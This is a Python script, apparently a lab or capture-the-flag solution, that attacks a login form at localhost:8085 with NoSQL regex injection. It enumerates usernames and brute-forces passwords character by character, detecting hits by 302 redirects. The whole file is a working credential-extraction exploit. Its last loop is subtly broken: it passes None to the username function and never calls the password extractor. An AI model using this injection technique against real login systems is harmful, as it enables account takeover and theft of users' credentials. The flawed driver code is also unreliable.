import pip._vendor.requests as requests
import string

url = "http://localhost:8085"
#headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "flsjd6eopud6v0m6oaiphkgl90"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params,  cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames(prefix):
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*"}
    for c in possible_chars:
        username = "^" + prefix + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print(username)
            for user in get_usernames(prefix + c):
                usernames.append(user)
    return usernames

for u in get_usernames(""):
    get_usernames(None)